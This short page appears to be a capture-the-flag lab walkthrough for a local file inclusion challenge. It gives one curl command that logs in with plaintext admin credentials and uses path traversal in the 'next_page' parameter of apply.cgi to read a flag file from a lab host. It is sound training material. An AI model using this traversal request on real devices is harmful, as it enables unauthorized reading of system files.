+++
title = "Local File Inclusion"
date = 2021-10-18T20:39:54-06:00
weight = 5
+++

## Local File Inclusion
Run the following command to retrieve the flag:
```sh
curl --user 'admin:LvawK!*C@6MR!Cz#*V2$ze@#7v75iT' -X POST -d "submit_type=wsc_method2&change_action=gozila_cgi&next_page=../../tmp/flag.txt" http://172.21.0.15:8080/apply.cgi
```
The `next_page` parameter in the request specifies the file we want to read. The content of the file will be returned in the response.
